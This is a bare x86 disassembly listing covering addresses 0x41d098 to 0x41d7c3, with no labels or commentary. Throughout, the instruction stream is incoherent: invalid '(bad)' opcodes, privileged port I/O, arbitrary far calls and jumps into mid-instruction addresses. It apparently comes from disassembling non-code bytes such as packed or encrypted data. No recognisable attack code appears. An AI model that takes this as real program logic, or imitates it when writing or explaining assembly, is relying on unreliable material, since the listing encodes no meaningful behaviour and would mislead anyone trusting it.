  41d098:	shl    BYTE PTR cs:[edi+0x5823c6f9],cl
  41d09f:	cmovns esi,DWORD PTR [ebx]
  41d0a2:	push   edx
  41d0a3:	add    BYTE PTR [edi-0x57],dl
  41d0a6:	stos   DWORD PTR es:[edi],eax
  41d0a7:	mov    cl,0xe5
  41d0a9:	xchg   ebx,eax
  41d0aa:	pop    esp
  41d0ab:	dec    ecx
  41d0ac:	dec    ebp
  41d0ad:	xchg   esi,eax
  41d0ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0af:	call   0x48ab:0xedb2937a
  41d0b6:	imul   DWORD PTR [ebx+0x10]
  41d0b9:	int    0xa5
  41d0bb:	out    0x47,al
  41d0bd:	shl    BYTE PTR [eax+0x75db0dc0],1
  41d0c3:	int3   
  41d0c4:	push   cx
  41d0c6:	scas   eax,DWORD PTR es:[edi]
  41d0c7:	adc    ebp,DWORD PTR [bx-0x42a6]
  41d0cc:	push   0x4c
  41d0ce:	mov    edx,0xa1324c5b
  41d0d3:	shl    DWORD PTR [eax],0x68
  41d0d6:	js     0x41d0b2
  41d0d8:	pop    ss
  41d0d9:	lahf   
  41d0da:	cmp    al,al
  41d0dc:	mov    dh,0x3a
  41d0de:	ficom  DWORD PTR [eax]
  41d0e0:	jmp    0xa188b64a
  41d0e5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d0e6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0e7:	and    ebp,ebx
  41d0e9:	test   eax,0x6a54727e
  41d0ee:	push   ss
  41d0ef:	cmp    ah,dh
  41d0f1:	sub    eax,0x6f4b32ae
  41d0f6:	scas   eax,DWORD PTR es:[edi]
  41d0f7:	pop    edi
  41d0f8:	dec    eax
  41d0f9:	xor    eax,0xa5c934cc
  41d0fe:	test   BYTE PTR [esi-0x15],al
  41d101:	cmp    al,0x4
  41d103:	inc    eax
  41d104:	aad    0x58
  41d106:	clc    
  41d107:	and    DWORD PTR [eax],ebx
  41d109:	mov    BYTE PTR [esi+edi*1-0x4a64e62],ah
  41d110:	cdq    
  41d111:	xlat   BYTE PTR ds:[ebx]
  41d112:	ror    BYTE PTR [ebp+edx*8+0x15],1
  41d116:	cmp    ch,0xdf
  41d119:	mov    edx,0xcf0a19cd
  41d11e:	mov    dh,BYTE PTR [ebp+0x13]
  41d121:	xchg   edx,eax
  41d122:	xor    BYTE PTR [ebp+0x8eb5d0b],ah
  41d128:	adc    dh,ah
  41d12a:	(bad)  
  41d12c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d12d:	int3   
  41d12e:	int    0xbe
  41d130:	push   0xfffffff0
  41d132:	inc    esi
  41d133:	cmp    DWORD PTR [eax-0x7fa7d361],edi
  41d139:	cmps   DWORD PTR ds:[si],DWORD PTR es:[di]
  41d13b:	cmp    BYTE PTR [ebx-0x1b0619b7],al
  41d141:	dec    ecx
  41d142:	jp     0x41d0d2
  41d144:	sub    edx,DWORD PTR [ebp-0x3b]
  41d147:	adc    al,0xc4
  41d149:	and    DWORD PTR [ecx-0x10],eax
  41d14c:	js     0x41d1be
  41d14e:	inc    eax
  41d14f:	rcl    al,cl
  41d151:	mov    eax,0x14fbef8f
  41d156:	popf   
  41d157:	mov    ecx,0x1a2e0fd9
  41d15c:	bound  esi,QWORD PTR [ecx+0x7d]
  41d15f:	idiv   BYTE PTR [edx]
  41d161:	ret    0xa85
  41d164:	sbb    edx,0xa
  41d167:	addr16 (bad) 
  41d169:	and    esp,edx
  41d16b:	out    0x74,eax
  41d16d:	jl     0x41d1d4
  41d16f:	data16 fistp QWORD PTR [eax]
  41d172:	fadd   st(4),st
  41d174:	enter  0xfe38,0x7b
  41d178:	test   al,0x1f
  41d17a:	sub    al,0x56
  41d17c:	pop    DWORD PTR [edi+0x75663bfd]
  41d182:	dec    bl
  41d184:	inc    edx
  41d185:	iret   
  41d186:	push   edx
  41d187:	pop    ecx
  41d188:	push   ecx
  41d189:	(bad)  
  41d18a:	mov    al,0xdc
  41d18c:	inc    ebx
  41d18d:	loopne 0x41d20c
  41d18f:	sub    al,BYTE PTR [ebx]
  41d191:	popa   
  41d192:	xchg   BYTE PTR [eax],dl
  41d194:	test   DWORD PTR [eax-0x1e5623e1],ecx
  41d19a:	stc    
  41d19b:	dec    esp
  41d19c:	int3   
  41d19d:	ret    
  41d19e:	jbe    0x41d12d
  41d1a0:	and    al,0xb0
  41d1a2:	sbb    DWORD PTR [edx],ebp
  41d1a4:	adc    BYTE PTR [ecx-0x37ad306f],dh
  41d1aa:	(bad)  
  41d1ab:	adc    DWORD PTR ds:[ecx-0x71],ebp
  41d1af:	fwait
  41d1b0:	adc    DWORD PTR [edi],edi
  41d1b2:	dec    ebp
  41d1b3:	retf   
  41d1b4:	add    eax,0x3c2482dc
  41d1b9:	fsubr  QWORD PTR [eax-0x3e2aee76]
  41d1bf:	jp     0x41d1f9
  41d1c1:	xchg   edi,eax
  41d1c2:	xor    esi,DWORD PTR [eax-0x5e]
  41d1c5:	je     0x41d1d4
  41d1c7:	adc    al,0xba
  41d1c9:	int    0x47
  41d1cb:	lods   al,BYTE PTR ds:[esi]
  41d1cc:	into   
  41d1cd:	xchg   DWORD PTR [edx],edi
  41d1cf:	pop    ds
  41d1d0:	inc    edx
  41d1d1:	jecxz  0x41d1de
  41d1d3:	icebp  
  41d1d4:	inc    esp
  41d1d5:	mov    WORD PTR ds:0xe13455c2,?
  41d1db:	push   edi
  41d1dc:	dec    esi
  41d1dd:	clc    
  41d1de:	std    
  41d1df:	sbb    ebp,DWORD PTR [edx+0x25acddf6]
  41d1e5:	jbe    0x41d241
  41d1e7:	call   0xe488d1ea
  41d1ec:	dec    esp
  41d1ed:	xchg   ebp,eax
  41d1ee:	lock inc ebp
  41d1f0:	and    bl,cl
  41d1f2:	daa    
  41d1f3:	bound  esi,QWORD PTR [edi+esi*8-0x3a]
  41d1f7:	mov    edx,0xc08408bb
  41d1fc:	shr    DWORD PTR [esi-0x316daaf7],1
  41d202:	dec    ebx
  41d203:	mov    edi,0xbbbde36c
  41d208:	dec    ebx
  41d209:	test   DWORD PTR [eax+0x6d],esi
  41d20c:	fisttp QWORD PTR [esi]
  41d20e:	cmp    bl,BYTE PTR [edi]
  41d210:	jg     0x41d28a
  41d212:	sbb    BYTE PTR [eax],dh
  41d214:	cmp    al,0x1a
  41d216:	(bad)  
  41d217:	lods   eax,DWORD PTR ds:[esi]
  41d218:	(bad)  
  41d219:	call   0x723c:0x9b160ed7
  41d220:	jp     0x41d230
  41d222:	dec    eax
  41d223:	xor    edi,edi
  41d225:	xchg   ebp,eax
  41d226:	cmp    ebx,DWORD PTR [esi+0x35949ba7]
  41d22c:	mov    bh,cl
  41d22e:	ins    DWORD PTR es:[edi],dx
  41d22f:	cld    
  41d230:	xchg   ebp,eax
  41d231:	loop   0x41d1cc
  41d233:	mov    esi,0xe0eda21
  41d238:	stos   DWORD PTR es:[edi],eax
  41d239:	int    0x6b
  41d23b:	adc    al,0x3c
  41d23d:	hlt    
  41d23e:	loope  0x41d24b
  41d240:	sbb    al,0x81
  41d242:	jge    0x41d250
  41d244:	jl     0x41d285
  41d246:	cmp    DWORD PTR [ecx+0x7f],ecx
  41d249:	xor    BYTE PTR [eax+0x36],dl
  41d24c:	stos   DWORD PTR es:[edi],eax
  41d24d:	pop    ss
  41d24e:	mov    esp,0xe29328eb
  41d253:	jnp    0x41d255
  41d255:	cmp    eax,eax
  41d257:	enter  0x2ce3,0x67
  41d25b:	out    dx,eax
  41d25c:	jge    0x41d259
  41d25e:	add    ebx,esi
  41d260:	or     al,0x6b
  41d262:	fadd   QWORD PTR [ebx]
  41d264:	mov    ch,0x29
  41d266:	std    
  41d267:	popa   
  41d268:	fdivr  DWORD PTR ds:0x2505d6b4
  41d26e:	scas   eax,DWORD PTR es:[edi]
  41d26f:	in     al,dx
  41d270:	xchg   BYTE PTR [ebx+0x51d878a4],cl
  41d276:	jne    0x41d24c
  41d278:	jg     0x41d221
  41d27a:	sahf   
  41d27b:	xor    eax,0x3b9eadf7
  41d280:	cmp    DWORD PTR [edx+0x5f],ecx
  41d283:	in     al,dx
  41d284:	push   es
  41d285:	std    
  41d286:	sbb    eax,0x6343d2de
  41d28b:	shl    DWORD PTR [ebp-0x14],0x18
  41d28f:	and    BYTE PTR [ecx-0x2e97c1e1],0xdb
  41d296:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d297:	dec    esp
  41d298:	xchg   esi,eax
  41d299:	lock ja 0x41d2a9
  41d29c:	jbe    0x41d238
  41d29e:	pmullw mm6,QWORD PTR [edi]
  41d2a1:	sub    eax,0x1252a07f
  41d2a6:	fidiv  WORD PTR [ebp-0x2822c355]
  41d2ac:	mov    ch,0xb8
  41d2ae:	call   0xf600:0xb49c0ed0
  41d2b5:	iret   
  41d2b6:	add    BYTE PTR [edx],0x90
  41d2b9:	lock outs dx,BYTE PTR ds:[esi]
  41d2bb:	(bad)  
  41d2bc:	std    
  41d2bd:	add    BYTE PTR [ebp+0x3752cb8e],bl
  41d2c3:	outs   dx,DWORD PTR ds:[esi]
  41d2c4:	cmp    ah,dl
  41d2c6:	int3   
  41d2c7:	xchg   esi,eax
  41d2c8:	mov    bl,0x2d
  41d2ca:	inc    ecx
  41d2cb:	and    dl,ch
  41d2cd:	call   DWORD PTR [eax+0x6bcd27e4]
  41d2d3:	es sub eax,0xc277b50e
  41d2d9:	add    al,cl
  41d2db:	xor    al,0xa8
  41d2dd:	test   eax,0xa2dcec02
  41d2e2:	jne    0x41d319
  41d2e4:	call   0x14ce:0xf4cd9117
  41d2eb:	dec    esi
  41d2ec:	adc    edi,DWORD PTR [ecx+0x2d]
  41d2ef:	pusha  
  41d2f0:	std    
  41d2f1:	cld    
  41d2f2:	inc    esi
  41d2f3:	push   0x6d979f51
  41d2f8:	daa    
  41d2f9:	popa   
  41d2fa:	or     al,0x80
  41d2fc:	mov    BYTE PTR [ecx+0x55],dh
  41d2ff:	or     bl,ah
  41d301:	pushf  
  41d302:	lods   eax,DWORD PTR ds:[esi]
  41d303:	pop    esp
  41d304:	cmp    ebp,DWORD PTR [esi+0x453fa598]
  41d30a:	push   edi
  41d30b:	xor    eax,0x5c8c6211
  41d310:	jecxz  0x41d2bb
  41d312:	shl    bh,1
  41d314:	les    ebx,FWORD PTR [ebx-0x75]
  41d317:	jns    0x41d322
  41d319:	sbb    dl,BYTE PTR [ecx+0x12]
  41d31c:	xor    BYTE PTR [ebx+0x72],0x9c
  41d320:	xor    al,0x55
  41d322:	hlt    
  41d323:	aas    
  41d324:	sub    BYTE PTR [edi],bh
  41d326:	cmc    
  41d327:	cmp    al,bl
  41d329:	scas   eax,DWORD PTR es:[edi]
  41d32a:	or     DWORD PTR [esi-0xd97b184],0x14d5d4a
  41d334:	xor    dl,BYTE PTR [eax+eiz*8]
  41d337:	mov    BYTE PTR [edx],cl
  41d339:	ins    BYTE PTR es:[edi],dx
  41d33a:	out    0x39,al
  41d33c:	ja     0x41d392
  41d33e:	jo     0x41d3b5
  41d340:	inc    edx
  41d341:	push   ecx
  41d342:	cmovno edi,DWORD PTR [ebx+eiz*4-0x7eceb64]
  41d34a:	dec    edx
  41d34b:	pop    ebp
  41d34c:	xchg   ecx,eax
  41d34d:	mov    ebx,0x7cc76b3c
  41d352:	std    
  41d353:	popf   
  41d354:	sub    eax,0xb6ba8068
  41d359:	xor    al,0xcc
  41d35b:	out    0x9d,al
  41d35d:	push   edi
  41d35e:	pop    ebp
  41d35f:	and    DWORD PTR [eax],0x16452e52
  41d365:	iret   
  41d366:	(bad)  
  41d367:	stos   BYTE PTR es:[edi],al
  41d368:	xchg   DWORD PTR [edi+ecx*2+0x71],ebx
  41d36c:	xor    DWORD PTR [edx],eax
  41d36e:	add    DWORD PTR [edi-0x2521181f],eax
  41d374:	retf   0x6350
  41d377:	or     edi,DWORD PTR [edx+0x11867d46]
  41d37d:	fdivr  DWORD PTR [ecx+0x6b45ce6a]
  41d383:	call   0x7fb39b31
  41d388:	push   0xfffffffd
  41d38a:	stc    
  41d38b:	inc    ebx
  41d38c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d38d:	jg     0x41d3d7
  41d38f:	mov    ch,0x63
  41d391:	add    edx,DWORD PTR [ebx+edx*4]
  41d394:	arpl   WORD PTR [edi-0x65],di
  41d397:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d398:	push   edx
  41d399:	lock dec ecx
  41d39b:	cwde   
  41d39c:	and    bh,BYTE PTR ds:0x58e1b0a2
  41d3a2:	into   
  41d3a3:	jg     0x41d3cb
  41d3a5:	sbb    al,BYTE PTR [ebp-0x6981b2eb]
  41d3ab:	pop    ebp
  41d3ac:	inc    ebp
  41d3ad:	adc    bh,BYTE PTR [esi]
  41d3af:	(bad)  
  41d3b0:	addr16 xchg al,dh
  41d3b3:	fimul  WORD PTR [ebp+0x7ecaa034]
  41d3b9:	cmc    
  41d3ba:	jecxz  0x41d361
  41d3bc:	sub    dl,BYTE PTR [ecx+0xc]
  41d3bf:	data16 sahf 
  41d3c1:	popa   
  41d3c2:	fwait
  41d3c3:	stos   DWORD PTR es:[edi],eax
  41d3c4:	inc    edi
  41d3c5:	sbb    BYTE PTR [ebx],ah
  41d3c7:	jnp    0x41d442
  41d3c9:	pop    edi
  41d3ca:	xor    eax,DWORD PTR ds:0x80f463eb
  41d3d0:	aas    
  41d3d1:	outs   dx,DWORD PTR ds:[esi]
  41d3d2:	push   es
  41d3d3:	in     al,dx
  41d3d4:	add    DWORD PTR [esi-0x4a4afe6a],ebp
  41d3da:	cmp    edi,DWORD PTR [eax-0x72e4ee1f]
  41d3e0:	in     eax,dx
  41d3e1:	push   ds
  41d3e2:	lea    esi,[ebx+0x46]
  41d3e5:	xchg   ch,ah
  41d3e7:	add    dl,al
  41d3e9:	in     al,0xc9
  41d3eb:	cmp    eax,0x9961d834
  41d3f0:	push   edi
  41d3f1:	jno    0x41d429
  41d3f3:	push   0xb7508be1
  41d3f8:	adc    bl,BYTE PTR [eax+0x37]
  41d3fb:	inc    ebp
  41d3fc:	ins    DWORD PTR es:[edi],dx
  41d3fd:	es enter 0x128,0xe1
  41d402:	xor    edx,DWORD PTR [ecx+eax*1+0x32]
  41d406:	jl     0x41d41f
  41d408:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d409:	out    0x56,al
  41d40b:	jecxz  0x41d3a4
  41d40d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d40e:	lahf   
  41d40f:	cs jp  0x41d45d
  41d412:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d413:	pop    ebp
  41d414:	popa   
  41d415:	lock leave 
  41d417:	mov    cl,0xd2
  41d419:	scas   al,BYTE PTR es:[edi]
  41d41a:	cmp    DWORD PTR [edi-0x1b49e608],0x1e
  41d421:	inc    edx
  41d422:	lds    edx,FWORD PTR [edi]
  41d424:	retf   0x602
  41d427:	push   edi
  41d428:	pushf  
  41d429:	sub    eax,0x112af6cb
  41d42e:	icebp  
  41d42f:	jg     0x41d4a4
  41d431:	(bad)  
  41d432:	and    ecx,esp
  41d434:	out    0xde,eax
  41d436:	cli    
  41d437:	scas   al,BYTE PTR es:[edi]
  41d438:	mov    al,ds:0xc4a78f67
  41d43d:	dec    edi
  41d43e:	dec    esp
  41d43f:	add    eax,0x903654ef
  41d444:	out    dx,eax
  41d445:	cmp    al,BYTE PTR [ecx-0x3c]
  41d448:	sbb    DWORD PTR [eax-0x38ed75e6],0xf7c83922
  41d452:	lock int 0x8a
  41d455:	call   0x6a1e:0x5124a27e
  41d45c:	cmp    eax,edx
  41d45e:	or     BYTE PTR [ebp+0x5],cl
  41d461:	mov    eax,ds:0x4a0b0a4a
  41d466:	or     bh,dl
  41d468:	and    dh,BYTE PTR [edi+0x5f]
  41d46b:	ret    
  41d46c:	aas    
  41d46d:	addr16 pop edi
  41d46f:	sti    
  41d470:	push   edx
  41d471:	lods   al,BYTE PTR ds:[esi]
  41d472:	and    al,0x4f
  41d474:	push   ecx
  41d475:	mov    cl,0x73
  41d477:	jne    0x41d40b
  41d479:	lods   eax,DWORD PTR ds:[esi]
  41d47a:	cld    
  41d47b:	adc    BYTE PTR [edi-0x15],dh
  41d47e:	add    BYTE PTR [edx+0x826d8b3],0x1e
  41d485:	jmp    0x41d464
  41d487:	iret   
  41d488:	adc    DWORD PTR [esp+ebp*4],ebx
  41d48b:	mov    esp,0x7f92299d
  41d490:	mov    bh,0xf4
  41d492:	out    0x3d,eax
  41d494:	xchg   esi,eax
  41d495:	or     cl,0x68
  41d498:	hlt    
  41d499:	loopne 0x41d512
  41d49b:	sub    al,0xad
  41d49d:	ficomp DWORD PTR [eax*2-0x27f0cd83]
  41d4a4:	shr    DWORD PTR [ecx+0xf150a2c],1
  41d4aa:	js     0x41d45a
  41d4ac:	clc    
  41d4ad:	into   
  41d4ae:	ja     0x41d516
  41d4b0:	adc    ah,BYTE PTR cs:[esi]
  41d4b3:	jg     0x41d52d
  41d4b5:	(bad)  [ecx+eax*2-0x59]
  41d4b9:	pop    edx
  41d4ba:	sbb    al,0x90
  41d4bc:	push   edi
  41d4bd:	call   0xde7820cd
  41d4c2:	cmp    bl,dl
  41d4c4:	jle    0x41d49d
  41d4c6:	cmp    eax,0xd158ef0f
  41d4cb:	dec    edx
  41d4cc:	dec    eax
  41d4cd:	jl     0x41d506
  41d4cf:	xor    eax,0xc9453423
  41d4d4:	add    bh,BYTE PTR [ebp-0x1fd279e1]
  41d4da:	sbb    DWORD PTR [ebp-0x39d5e08d],ebp
  41d4e0:	ja     0x41d51a
  41d4e2:	xlat   BYTE PTR ds:[ebx]
  41d4e3:	and    DWORD PTR [esi],ecx
  41d4e5:	call   0xe41a:0x5b73fb0d
  41d4ec:	adc    BYTE PTR [edi+0x30],cl
  41d4ef:	and    DWORD PTR [ecx+0x6f4d1ac1],ebx
  41d4f5:	and    BYTE PTR [ebx-0x5d58ffbd],bh
  41d4fb:	fcomp  QWORD PTR [ebp-0x396782e7]
  41d501:	push   0x6bbf089a
  41d506:	push   es
  41d507:	lods   eax,DWORD PTR es:[esi]
  41d509:	pop    eax
  41d50a:	xor    BYTE PTR [ecx],dh
  41d50c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d50d:	add    al,0x89
  41d50f:	sub    al,BYTE PTR [ebp-0x1b]
  41d512:	ret    
  41d513:	add    cl,BYTE PTR [ecx+0x5f3d10bc]
  41d519:	inc    ecx
  41d51a:	add    BYTE PTR [ebx+0x389aa5fb],al
  41d520:	les    edx,FWORD PTR [ebx+edi*8-0x5104e835]
  41d527:	fimul  DWORD PTR [ebx+edi*4]
  41d52a:	in     eax,dx
  41d52b:	call   0x61d2:0x6fcf1835
  41d532:	es xor cl,al
  41d535:	test   BYTE PTR [ebx-0x794538f9],bh
  41d53b:	pop    eax
  41d53c:	clc    
  41d53d:	pop    edx
  41d53e:	loope  0x41d509
  41d540:	shr    DWORD PTR [eax-0x274328f6],0xb3
  41d547:	lahf   
  41d548:	out    dx,al
  41d549:	fs push es
  41d54b:	push   edx
  41d54c:	aaa    
  41d54d:	ins    DWORD PTR es:[edi],dx
  41d54e:	mov    bh,0x75
  41d550:	mov    bh,0x43
  41d552:	push   ss
  41d553:	adc    eax,0x8ee319e2
  41d558:	sar    ah,0xd3
  41d55b:	jne    0x41d54d
  41d55d:	aas    
  41d55e:	(bad)  
  41d55f:	bound  ebx,QWORD PTR [ebx+0x72]
  41d562:	inc    eax
  41d563:	test   BYTE PTR [edi+0x7f],ah
  41d566:	jmp    0x41d507
  41d568:	xchg   ecx,eax
  41d569:	int    0xa3
  41d56b:	mov    dl,0x4d
  41d56d:	pop    DWORD PTR ds:0xbeba598a
  41d573:	sub    cl,BYTE PTR [esi+0x4485fe00]
  41d579:	and    bl,BYTE PTR [esi+0x49]
  41d57c:	in     eax,0xdd
  41d57e:	push   ds
  41d57f:	xchg   edx,eax
  41d580:	adc    bl,dh
  41d582:	jl     0x41d505
  41d584:	pop    ebx
  41d585:	sbb    cl,ch
  41d587:	dec    esi
  41d588:	js     0x41d561
  41d58a:	cli    
  41d58b:	mov    cl,0x94
  41d58d:	and    dh,BYTE PTR [esi+0x6a]
  41d590:	jmp    0x41d5f5
  41d592:	cwde   
  41d593:	dec    ecx
  41d594:	aam    0x57
  41d596:	jns    0x41d5f8
  41d598:	rcr    al,0x9
  41d59b:	mov    al,0x43
  41d59d:	clc    
  41d59e:	adc    eax,0x64f4f83
  41d5a3:	or     DWORD PTR [eax],ecx
  41d5a5:	push   0xffffffdd
  41d5a7:	out    dx,eax
  41d5a8:	pop    ss
  41d5a9:	pop    ebp
  41d5aa:	js     0x41d621
  41d5ac:	(bad)  
  41d5ad:	mov    al,0x72
  41d5af:	inc    edi
  41d5b0:	add    dl,BYTE PTR [esi+0x1e]
  41d5b3:	add    BYTE PTR [ecx+eiz*2-0x1307de9a],0x7d
  41d5bb:	in     al,0x1f
  41d5bd:	hlt    
  41d5be:	enter  0xf1ed,0x9b
  41d5c2:	adc    eax,0xd1e1db09
  41d5c7:	(bad)  
  41d5c8:	test   al,0xc7
  41d5ca:	add    bl,BYTE PTR [eax+0x1a]
  41d5cd:	in     eax,dx
  41d5ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d5cf:	out    0x44,eax
  41d5d1:	jnp    0x41d62f
  41d5d3:	test   eax,0x59fe6e43
  41d5d8:	fwait
  41d5d9:	rol    DWORD PTR [edi],1
  41d5db:	xchg   edi,eax
  41d5dc:	das    
  41d5dd:	xchg   ebx,eax
  41d5de:	or     ebx,eax
  41d5e0:	add    cl,bl
  41d5e2:	bound  ebp,QWORD PTR [eax]
  41d5e4:	retf   0x4c1c
  41d5e7:	in     al,dx
  41d5e8:	fnstsw WORD PTR gs:[edi-0x3d]
  41d5ec:	inc    edx
  41d5ed:	fcom   QWORD PTR [edx+0x1e]
  41d5f0:	in     al,0xfd
  41d5f2:	scas   al,BYTE PTR es:[edi]
  41d5f3:	(bad)  
  41d5f4:	fist   WORD PTR [ecx+ecx*4]
  41d5f7:	mov    dh,0x0
  41d5f9:	inc    ecx
  41d5fa:	arpl   WORD PTR ds:0xaea8982f,bx
  41d600:	push   fs
  41d602:	jmp    ebx
  41d604:	jle    0x41d5a0
  41d606:	inc    esi
  41d607:	ins    BYTE PTR es:[edi],dx
  41d608:	sbb    eax,0x21fa187a
  41d60d:	das    
  41d60e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d60f:	mov    edi,esi
  41d611:	lahf   
  41d612:	je     0x41d671
  41d614:	sbb    DWORD PTR [edx-0x7f],0xd32a2e0a
  41d61b:	xchg   ebp,edx
  41d61d:	int    0xab
  41d61f:	out    dx,eax
  41d620:	dec    esp
  41d621:	imul   ebx,DWORD PTR [eax+0x21],0xffffffa8
  41d625:	(bad)  
  41d627:	sahf   
  41d628:	push   eax
  41d629:	scas   eax,DWORD PTR es:[edi]
  41d62a:	inc    ebx
  41d62b:	adc    DWORD PTR [edi+0x6b],ecx
  41d62e:	sub    BYTE PTR ds:0x47611830,al
  41d634:	sbb    eax,0x69b349f9
  41d639:	retf   0xa831
  41d63c:	imul   esi,DWORD PTR [esi-0x7a67beb4],0xfc75eb3
  41d646:	jnp    0x41d5d1
  41d648:	mov    eax,DWORD PTR [edx+0x2aeed915]
  41d64e:	stos   BYTE PTR es:[edi],al
  41d64f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d650:	mov    eax,ds:0x8484e58a
  41d655:	aaa    
  41d656:	push   ss
  41d657:	hlt    
  41d658:	pop    ss
  41d659:	fldenv [esi-0x6f]
  41d65c:	imul   esi,DWORD PTR [ebp+0x10],0x1c760c33
  41d663:	aam    0x1
  41d665:	push   edx
  41d666:	cdq    
  41d667:	test   eax,0x9e990e64
  41d66c:	push   es
  41d66d:	mov    ds:0xbe9e76e2,al
  41d672:	mov    bl,0x94
  41d675:	pop    esp
  41d676:	adc    ah,BYTE PTR [ebp+eiz*8-0x4b]
  41d67a:	sub    eax,esi
  41d67c:	int    0x2a
  41d67e:	push   eax
  41d67f:	push   cs
  41d680:	loop   0x41d674
  41d682:	mov    DWORD PTR [eax+0x1a],ecx
  41d685:	ss dec esp
  41d687:	xchg   esp,esi
  41d689:	pop    esi
  41d68a:	jnp    0x41d64e
  41d68c:	push   0xf92f64e0
  41d691:	dec    esi
  41d692:	mov    dl,0xa9
  41d694:	outs   dx,DWORD PTR ds:[esi]
  41d695:	mov    ebp,0x7d21ddcf
  41d69a:	or     BYTE PTR [eax+0x1d84f696],dl
  41d6a0:	mov    ebp,0xaae94e72
  41d6a5:	pushf  
  41d6a6:	xchg   esp,eax
  41d6a7:	sti    
  41d6a8:	or     ebx,DWORD PTR [ebx-0x5ad12c46]
  41d6ae:	leave  
  41d6af:	dec    edi
  41d6b0:	popa   
  41d6b1:	xchg   esp,eax
  41d6b2:	sbb    DWORD PTR [eax+0x66],edi
  41d6b5:	cmp    BYTE PTR [esi+edi*8+0x7b57c57a],ah
  41d6bc:	cmc    
  41d6bd:	call   0xcf4637df
  41d6c2:	cwde   
  41d6c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6c4:	sbb    al,0x8
  41d6c6:	icebp  
  41d6c7:	(bad)  
  41d6c8:	xor    ecx,ebp
  41d6ca:	push   0x7c
  41d6cc:	test   DWORD PTR [edi+0x32],ebp
  41d6cf:	jbe    0x41d664
  41d6d1:	and    BYTE PTR [esi+0x43],dl
  41d6d4:	retf   0xcad9
  41d6d7:	fldcw  WORD PTR [edx]
  41d6d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d6da:	add    BYTE PTR [edx+0x78],bh
  41d6dd:	pop    esi
  41d6de:	mov    ecx,0xbe09633f
  41d6e3:	jp     0x41d6e5
  41d6e5:	xor    ebp,DWORD PTR [edx]
  41d6e7:	lea    ebx,[ebx-0x7c61e202]
  41d6ed:	imul   esp,esp,0xffffff98
  41d6f0:	out    0xf8,al
  41d6f2:	xchg   ebx,eax
  41d6f3:	ss pop esi
  41d6f5:	xchg   DWORD PTR [ecx+0x5c2cd9f2],esp
  41d6fb:	sub    eax,0x634fba30
  41d700:	(bad)  
  41d701:	ss loopne 0x41d70a
  41d704:	ds ins BYTE PTR es:[edi],dx
  41d706:	neg    BYTE PTR fs:[si+0x6e]
  41d70b:	ds scas al,BYTE PTR es:[edi]
  41d70d:	xchg   esi,eax
  41d70e:	adc    esp,eax
  41d710:	ss (bad) 
  41d713:	aas    
  41d714:	jnp    0x41d6bb
  41d716:	adc    al,0x39
  41d718:	and    al,0xb3
  41d71a:	dec    ebp
  41d71b:	adc    bl,BYTE PTR [edi]
  41d71d:	aas    
  41d71e:	add    eax,0x313d3c60
  41d723:	sbb    DWORD PTR [ebp+0x19],ecx
  41d726:	mov    ds:0x834d245a,al
  41d72c:	mov    cl,0x89
  41d72e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d72f:	push   ecx
  41d730:	icebp  
  41d731:	add    eax,DWORD PTR [edx+0x7e]
  41d734:	mov    cl,0xc4
  41d736:	xchg   BYTE PTR [esi],dh
  41d738:	fwait
  41d739:	jecxz  0x41d73a
  41d73b:	cmp    al,0x27
  41d73d:	push   ebp
  41d73e:	mov    cl,0xa6
  41d740:	pop    edx
  41d741:	ret    0xbe4d
  41d744:	adc    BYTE PTR [ebx-0x3bb53f2],bl
  41d74a:	jp     0x41d782
  41d74c:	repnz xlat BYTE PTR ds:[ebx]
  41d74e:	cmp    ah,al
  41d750:	or     edx,DWORD PTR [ebx+edi*4]
  41d753:	daa    
  41d754:	add    esi,DWORD PTR [ebp+0x4a]
  41d757:	fld    QWORD PTR [ecx]
  41d759:	loop   0x41d7be
  41d75b:	adc    al,0xf8
  41d75d:	fcomp  QWORD PTR [esi-0x7c]
  41d760:	lock mov ch,0xa9
  41d763:	push   ss
  41d764:	lods   al,BYTE PTR ds:[esi]
  41d765:	xor    al,0x29
  41d767:	jg     0x41d7da
  41d769:	fisttp DWORD PTR [esi]
  41d76b:	iret   
  41d76c:	mov    DWORD PTR [edx+0x3b],eax
  41d76f:	sti    
  41d770:	and    al,BYTE PTR [edi-0x49]
  41d773:	push   ss
  41d774:	mov    eax,ds:0xc389140b
  41d779:	push   ecx
  41d77a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d77b:	xor    eax,0xc05d8410
  41d780:	scas   eax,DWORD PTR es:[edi]
  41d781:	dec    ebx
  41d782:	mov    edx,0x66424bc0
  41d787:	(bad)  
  41d788:	push   0x8dffa52
  41d78d:	add    bl,ch
  41d78f:	add    DWORD PTR [esi+eiz*2],edi
  41d792:	jbe    0x41d74f
  41d794:	pop    ecx
  41d795:	cmp    eax,0xe3f5870b
  41d79a:	int3   
  41d79b:	fidivr WORD PTR [edx-0x2c]
  41d79e:	pop    esi
  41d79f:	xchg   esp,eax
  41d7a0:	out    0x75,eax
  41d7a2:	pop    esp
  41d7a3:	fs inc ebp
  41d7a5:	jae    0x41d7c4
  41d7a7:	jge    0x41d7ae
  41d7a9:	aam    0xcb
  41d7ab:	int    0x8d
  41d7ad:	shl    BYTE PTR [esi],0x4b
  41d7b0:	out    0x46,al
  41d7b2:	arpl   WORD PTR [ebx-0x2fd9eae7],di
  41d7b8:	js     0x41d73f
  41d7ba:	pop    eax
  41d7bb:	sbb    eax,0x8ad90e8
  41d7c0:	stc    
  41d7c1:	outs   dx,DWORD PTR ds:[esi]
  41d7c2:	inc    eax
  41d7c3:	xor    BYTE PTR [esi-0x326ff5a4],bh
